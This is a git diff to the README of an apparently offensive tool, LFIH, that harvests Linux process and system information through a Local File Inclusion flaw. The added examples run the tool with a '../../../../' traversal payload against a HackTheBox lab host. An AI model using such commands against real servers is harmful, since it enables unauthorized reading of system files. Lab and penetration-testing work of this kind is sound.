@@ -1,4 +1,4 @@
-# Linux-LFI-Harvester
+# 💫 Linux Sysinfo Harvester via LFI 💫
 Linux System Information Harvesting through Local File Inclusion (LFI) Vulnerability 🐱
 
 ```
@@ -34,3 +34,22 @@ optional arguments:
   -x64        Targeting an x64 machine (x32 by default)
 
 ```
+
+# Examples 👨‍🎤
+Retrieving processus informations : <br>
+```python3 LFIH.py -u http://bagel.htb:8000/?page=../../../../ -proc```
+
+Retrieving processes cmdlines (args) through 100 sync threads to increase speed : <br>
+```python3 LFIH.py -u http://bagel.htb:8000/?page=../../../../ -cmdlines -t 100```
+
+Retrieving processes cmdlines (args) with 50 threads and escaping "File not found" response string : <br>
+```python3 LFIH.py -u http://bagel.htb:8000/?page=../../../../ -cmdlines -t 50 -p "File not found"```
+
+# Screenshots 🍩
+<img src="https://i.ibb.co/HVHYcmw/image.png">
+<img src="https://i.ibb.co/jk5H2hb/image.png">
+
+
+
+
+
